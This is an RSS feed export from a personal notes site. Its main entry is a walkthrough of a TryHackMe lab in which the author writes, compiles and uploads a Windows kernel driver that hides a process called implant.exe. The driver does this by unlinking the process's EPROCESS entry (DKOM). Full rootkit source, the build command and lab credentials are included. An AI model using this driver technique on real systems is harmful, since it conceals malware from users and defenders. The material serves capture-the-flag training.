<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Kernel-Blackout]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>site-lib/media/favicon.png</url><title>Kernel-Blackout</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Wed, 04 Feb 2026 02:20:27 GMT</lastBuildDate><atom:link href="site-lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Wed, 04 Feb 2026 02:20:26 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Kernel-Blackout]]></title><description><![CDATA[Platform: TryHackMe
Room: Kernel Blackout
Difficulty: Hard
Objective: Build a Windows kernel driver to hide a specific process using Direct Kernel Object Manipulation (DKOM)
Techniques: Windows kernel programming, EPROCESS structure manipulation, DKOM
Category: Binary Exploitation / Windows Internals
Development Machine: 10.200.150.20 Target Machine: 10.200.150.10 Username: Administrator Password: KernelKernel2323 Connect to the development machine using Windows Remote Desktop Protocol (RDP). Once connected, you'll find Visual Studio and necessary development tools installed.Create a Windows kernel driver (.sys file) that hides the implant.exe process from system process listings. The process must continue running but become invisible to tools like Task Manager and process explorers.Windows maintains all active processes in a doubly-linked list within kernel memory. Each process is represented by an _EPROCESS structure containing various fields including process information and list pointers.Key Offsets Provided:
ActiveProcessLinks: Offset 0x2e8 (points to the list entry structure) ImageFileName: Offset 0x450 (contains the process name) These offsets are specific to the Windows version in the challenge and are crucial for successful manipulation.Create a C file rootflag.c:#include &lt;ntddk.h&gt;
#include &lt;wdm.h&gt; #define LINKS_OFFSET 0x2e8 #define NAME_OFFSET 0x450 void DriverUnload(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject);
} NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(DriverObject); UNREFERENCED_PARAMETER(RegistryPath); PEPROCESS CurrentProcess = PsInitialSystemProcess; for (int i = 0; i &lt; 2000; i++) { char* currentName = (char*)CurrentProcess + NAME_OFFSET; if (strncmp(currentName, "implant.exe", 11) == 0) { PLIST_ENTRY CurrentListEntry = (PLIST_ENTRY)((char*)CurrentProcess + LINKS_OFFSET); PLIST_ENTRY Prev = CurrentListEntry-&gt;Blink; PLIST_ENTRY Next = CurrentListEntry-&gt;Flink; Prev-&gt;Flink = Next; Next-&gt;Blink = Prev; CurrentListEntry-&gt;Flink = CurrentListEntry; CurrentListEntry-&gt;Blink = CurrentListEntry; break; } PLIST_ENTRY CurrentListEntry = (PLIST_ENTRY)((char*)CurrentProcess + LINKS_OFFSET); CurrentProcess = (PEPROCESS)((char*)CurrentListEntry-&gt;Flink - LINKS_OFFSET); } return STATUS_SUCCESS;
} Start Point: Begin from PsInitialSystemProcess (the System process)
Iteration: Loop through the process list with safety limit
Identification: Check process name at offset 0x450
Manipulation: When target found, modify its list pointers
Safety: Point removed process to itself to avoid crashes
Open Command Prompt and run:cl /W4 /D_AMD64_ /D_WIN64 /D_KERNEL_MODE rootflag.c /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\km" /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\shared" /link /driver /entry:DriverEntry /subsystem:native /out:hide.sys "C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\km\x64\ntoskrnl.lib"
<img alt="2026-02-04_18-15.png" src="images/2026-02-04_18-15.png" target="_self">
Open browser on development machine
Navigate to http://10.200.150.10
Upload the compiled hide.sys file
System automatically loads the driver Refresh the web page implant.exe should disappear from process list Flag appears automatically upon successful hiding <br><img alt="2026-02-03_17-31.png" src="images/2026-02-03_17-31.png" target="_self">Direct Kernel Object Manipulation involves:
Locating target process in kernel memory
Accessing its ActiveProcessLinks structure
Modifying forward/backward pointers to skip the target
Maintaining list integrity to prevent system crashes Offsets must match Windows version exactly Must include DriverUnload function for cleanup Iteration limits prevent infinite loops Self-referencing pointers ensure system stability This challenge demonstrates practical Windows kernel exploitation techniques. The solution involves writing a minimal kernel driver that manipulates system structures to hide processes. Successful completion requires understanding Windows internals, kernel programming, and safe memory manipulation techniques.Files Created:
rootflag.c - Source code hide.sys - Compiled driver Success Indicators: Driver compiles without errors Driver uploads successfully Process disappears from listing System remains stable Flag obtained ]]></description><link>kernel-blackout.html</link><guid isPermaLink="false">Kernel-Blackout.md</guid><pubDate>Wed, 04 Feb 2026 02:17:17 GMT</pubDate><enclosure url="images/2026-02-04_18-15.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;images/2026-02-04_18-15.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2026-02-04_18-15]]></title><description><![CDATA[<img src="images/2026-02-04_18-15.png" target="_self">]]></description><link>images/2026-02-04_18-15.html</link><guid isPermaLink="false">images/2026-02-04_18-15.png</guid><pubDate>Wed, 04 Feb 2026 01:59:41 GMT</pubDate><enclosure url="images/2026-02-04_18-15.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;images/2026-02-04_18-15.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2026-02-03_18-10]]></title><description><![CDATA[<img src="images/2026-02-03_18-10.png" target="_self">]]></description><link>images/2026-02-03_18-10.html</link><guid isPermaLink="false">images/2026-02-03_18-10.png</guid><pubDate>Tue, 03 Feb 2026 15:10:35 GMT</pubDate><enclosure url="images/2026-02-03_18-10.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;images/2026-02-03_18-10.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2026-02-03_18-09]]></title><description><![CDATA[<img src="images/2026-02-03_18-09.png" target="_self">]]></description><link>images/2026-02-03_18-09.html</link><guid isPermaLink="false">images/2026-02-03_18-09.png</guid><pubDate>Tue, 03 Feb 2026 15:09:09 GMT</pubDate><enclosure url="images/2026-02-03_18-09.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;images/2026-02-03_18-09.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2026-02-03_17-31]]></title><description><![CDATA[<img src="images/2026-02-03_17-31.png" target="_self">]]></description><link>images/2026-02-03_17-31.html</link><guid isPermaLink="false">images/2026-02-03_17-31.png</guid><pubDate>Tue, 03 Feb 2026 14:31:40 GMT</pubDate><enclosure url="images/2026-02-03_17-31.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;images/2026-02-03_17-31.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>